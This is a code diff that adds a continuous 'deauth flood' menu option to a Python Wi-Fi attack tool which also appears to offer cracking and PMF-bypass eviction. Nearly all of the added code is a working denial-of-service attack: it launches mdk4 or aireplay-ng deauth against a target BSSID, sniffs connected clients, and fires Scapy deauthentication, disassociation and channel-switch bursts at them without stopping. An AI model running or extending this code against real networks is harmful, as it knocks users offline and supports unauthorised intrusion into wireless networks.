@@ -582,6 +582,8 @@ class WifiGTR:
                     self.run_wpa_enterprise(bssid, channel, ssid_name)
                 elif action == '15': # Smart Crack
                     self.run_smart_crack(bssid, ssid_name)
+                elif action == '16': # Standalone Deauth Flood
+                    self.run_deauth_flood(bssid, channel, ssid_name)
                 elif action == '0':
                     break
                 else:
@@ -598,6 +600,136 @@ class WifiGTR:
                     input("Press Enter to return to menu...")
                 except Exception:
                     pass
+
+    def run_deauth_flood(self, bssid, channel, ssid):
+        """Standalone continuous Deauth flood.
+
+        Uses EVERY available method at once for maximum reliability:
+          - mdk4 -B <bssid> (strong, continuous native deauth), or
+            aireplay-ng -0 0 broadcast if mdk4 is missing
+          - Scapy multi-vector bursts (broadcast deauth + disassoc + CSA)
+          - targeted Scapy deauth for every client discovered live
+        Runs until the user presses Ctrl+C.
+        """
+        print(f"\n{C_CYAN}--- STANDALONE DEAUTH FLOOD ---{C_RESET}")
+        print(f"Target  : {C_GREEN}{ssid}{C_RESET}")
+        print(f"BSSID   : {utils.mask_bssid(bssid)}")
+        print(f"Channel : {C_YELLOW}{channel}{C_RESET}")
+        print(f"{C_YELLOW}[*] Flooding deauth — press Ctrl+C to stop.{C_RESET}")
+
+        # Lock both cards to the target channel (injector does the injecting;
+        # in dual-card mode it is a different physical card from the sniffer).
+        utils.run_command(["ip", "link", "set", self.interface, "up"])
+        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
+        if self.injector_interface != self.interface:
+            utils.run_command(["ip", "link", "set", self.injector_interface, "up"])
+            utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])
+
+        inj = self.injector_interface
+
+        # Scapy multi-vector engine (always available when scapy is installed)
+        engine = None
+        try:
+            from wifi_nightmare.eviction import AdvancedEviction
+            engine = AdvancedEviction(inj, bssid, channel, ssid)
+        except Exception as e:
+            print(f"{C_YELLOW}[!] Scapy eviction engine unavailable: {e}{C_RESET}")
+
+        # Strongest native deauth as a background process: mdk4 -B (direct AP
+        # targeting), else aireplay-ng -0 0 (0 = run forever) broadcast.
+        procs = []
+        if shutil.which("mdk4"):
+            try:
+                p = subprocess.Popen(
+                    ["mdk4", inj, "d", "-B", bssid, "-c", str(channel)],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+                procs.append(("mdk4", p))
+                print(f"{C_GREEN}[+] mdk4 -B deauth active on {inj}{C_RESET}")
+            except Exception as e:
+                logger.debug(f"mdk4 deauth start failed: {e}")
+        elif shutil.which("aireplay-ng"):
+            try:
+                p = subprocess.Popen(
+                    ["aireplay-ng", "-0", "0", "-a", bssid,
+                     "--ignore-negative-one", inj],
+                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
+                )
+                procs.append(("aireplay-ng", p))
+                print(f"{C_GREEN}[+] aireplay-ng broadcast deauth active on {inj}{C_RESET}")
+            except Exception as e:
+                logger.debug(f"aireplay deauth start failed: {e}")
+        else:
+            print(f"{C_YELLOW}[i] No mdk4/aireplay-ng found — using Scapy only "
+                  f"(install mdk4 for a stronger flood).{C_RESET}")
+
+        clients = set()
+        def _sniff_cb(pkt):
+            try:
+                if Dot11 is None or not pkt.haslayer(Dot11):
+                    return
+                a1 = (pkt.addr1 or "").lower()
+                a2 = (pkt.addr2 or "").lower()
+                b = bssid.lower()
+                cm = None
+                if a1 == b and a2 and a2 != "ff:ff:ff:ff:ff:ff" and not a2.startswith("33:33"):
+                    cm = a2
+                elif a2 == b and a1 and a1 != "ff:ff:ff:ff:ff:ff" and not a1.startswith("33:33"):
+                    cm = a1
+                if cm:
+                    clients.add(cm)
+            except Exception:
+                pass
+
+        total_frames = 0
+        start = time.time()
+        try:
+            with utils.SignalManager() as sig:
+                while not sig.stopped:
+                    # Briefly listen for client stations (targeted deauth)
+                    if HAS_SCAPY and sniff is not None:
+                        try:
+                            sniff(iface=self.sniffer_interface, prn=_sniff_cb,
+                                  timeout=1, store=0)
+                        except OSError:
+                            utils.run_command(["ip", "link", "set", self.sniffer_interface, "up"])
+                        except Exception:
+                            pass
+                    else:
+                        time.sleep(1)
+
+                    # Scapy multi-vector: targeted + broadcast + CSA
+                    if engine:
+                        try:
+                            for cm in list(clients):
+                                total_frames += engine.send_deauth_burst(client_mac=cm, count=3)
+                            total_frames += engine.send_deauth_burst(client_mac=None, count=4)
+                            total_frames += engine.send_csa_burst(count=2)
+                        except Exception as e:
+                            logger.debug(f"scapy eviction error: {e}")
+
+                    native = ", ".join(n for n, _ in procs) or "scapy-only"
+                    elapsed = time.time() - start
+                    sys.stdout.write(
+                        f"\r\033[K{C_CYAN}    [{elapsed:.0f}s] Deauthing {utils.mask_bssid(bssid)} "
+                        f"via {native} | clients: {len(clients)} | scapy frames: {total_frames}{C_RESET}"
+                    )
+                    sys.stdout.flush()
+        finally:
+            for name, p in procs:
+                try:
+                    if p.poll() is None:
+                        p.terminate()
+                        p.wait(timeout=2)
+                except Exception:
+                    try:
+                        p.kill()
+                    except Exception:
+                        pass
+
+        print(f"\n{C_YELLOW}[*] Deauth flood stopped. "
+              f"Clients seen: {len(clients)} | Scapy frames sent: {total_frames}{C_RESET}")
+        input("Press Enter to return to menu...")
 
     def run_multivector_eviction(self, bssid, channel, ssid):
         """Run intelligent multi-vector eviction (Deauth + CSA + BTM) to bypass PMF."""
